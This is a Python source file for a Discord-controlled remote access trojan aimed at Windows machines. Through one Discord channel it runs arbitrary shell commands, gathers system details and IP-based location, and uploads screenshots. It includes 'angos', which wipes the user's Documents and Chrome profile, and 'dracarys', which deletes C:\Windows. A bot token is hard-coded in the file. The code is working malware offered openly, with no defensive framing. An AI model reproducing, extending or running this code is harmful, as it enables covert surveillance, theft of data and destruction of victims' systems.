import getpass
import platform
import os
import subprocess
import ctypes
import discord
import requests
from discord.ext import commands
from PIL import ImageGrab
import asyncio

TOKEN = 'MTMyOTI0ODc2MDczOTQwMTc2OQ.GPJhEA.QWGMX3YBKxTEKVtNLuYdRCOiMY6vdWThLnexgE'
COMMAND_CHANNEL_ID = 1329249832732327999
PREFIX = "!"
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

def check_admin_privileges():
    """Check if the script is running with elevated privileges (admin)."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

async def send_screenshot_to_discord(file_path):
    """Send a screenshot file to Discord."""
    try:
        channel = discord.utils.get(bot.get_all_channels(), id=COMMAND_CHANNEL_ID)
        if channel:
            await channel.send(file=discord.File(file_path))
        else:
            print("Channel not found.")
    except Exception as e:
        print(f"Error sending file to Discord: {e}")

async def execute_command(command):
    """Handle various commands to interact with the system or perform actions."""
    if command == 'cd ..':
        os.chdir('..')
        return f"Changed current directory to: {os.getcwd()}"
    elif command == 'location':
        return await get_location()
    elif command == 'info':
        return await get_system_info()
    elif command == 'screenshot':
        return await take_screenshot()
    elif command == 'dracarys':
        return dracarys()
    elif command == 'angos':
        return angos()
    elif command == 'help':
        return '''
        HELP MENU:
        !dracarys            | Obliterate the system (requires admin privileges)
        !angos               | Burn sensitive files to ashes
        !location            | Get the system's location info (IP, Country, City, etc.)
        !info                | Get detailed system info
        !screenshot          | Take a screenshot and send to Discord
        '''
    else:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            return result.strip()
        except subprocess.CalledProcessError as e:
            return f"Command execution failed. Error: {e.output.strip()}"

async def get_location():
    """Fetch the system's location based on public IP."""
    try:
        response = requests.get('https://ifconfig.me/ip')
        public_ip = response.text.strip()

        try:
            url = f'http://ip-api.com/json/{public_ip}'
            response = requests.get(url)
            data = response.json()
            country = data.get('country')
            region = data.get('region')
            city = data.get('city')
            lat = data.get('lat')
            lon = data.get('lon')
            timezone = data.get('timezone')
            isp = data.get('isp')

            final = f"Country: {country},\nRegion: {region},\nCity: {city},\nLatitude: {lat},\nLongitude: {lon},\nTimezone: {timezone},\nISP: {isp}"
            return final
        except Exception as e:
            return 'Some error occurred while fetching location.'
    except Exception as e:
        return 'Could not retrieve public IP address.'

async def get_system_info():
    """Fetch the system's basic info."""
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': getpass.getuser(),
    }
    info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    return info_string

async def take_screenshot():
    """Capture a screenshot and send it to Discord."""
    file_path = "screenshot.png"
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(file_path)
        await send_screenshot_to_discord(file_path)
        os.remove(file_path)
        return "Screenshot sent to Discord."
    except Exception as e:
        return f"Error taking screenshot: {e}"

def angos():
    """Burn sensitive files to ashes."""
    if not check_admin_privileges():
        return "Angos requires admin privileges!"
    
    username = os.getenv("USERNAME")
    critical_paths = [
        f"C:\\Users\\{username}\\Documents\\*",
        f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\*",
        "C:\\Windows\\Temp\\*.*"
    ]

    try:
        for path in critical_paths:
            if '*' in path:
                dir_path = os.path.dirname(path)
                subprocess.run(f'del /f /s /q "{dir_path}"', shell=True, check=True)
            else:
                if os.path.exists(path):
                    if os.path.isfile(path):
                        os.remove(path)
                    else:
                        subprocess.run(f'rd /s /q "{path}"', shell=True, check=True)
        return "Angos has burned sensitive files to ashes."
    except Exception as e:
        return f"Failed to unleash Angos: {str(e)}"

def dracarys():
    """Execute full system destruction."""
    if not check_admin_privileges():
        return "Dracarys requires admin privileges!"
    
    try:
        # Destructive command targeting critical system directories
        subprocess.run("rd /s /q C:\\Windows", shell=True, check=True)
        return "Dracarys has unleashed its full fury and destroyed the system."
    except Exception as e:
        return f"Failed to unleash Dracarys: {str(e)}"

@bot.event
async def on_message(message):
    """Handle incoming messages and execute commands."""
    if message.channel.id == COMMAND_CHANNEL_ID:
        if message.content.startswith(PREFIX):
            command = message.content[len(PREFIX):]
            result = await execute_command(command)
            await message.channel.send(result)
    await bot.process_commands(message)

bot.run(TOKEN)
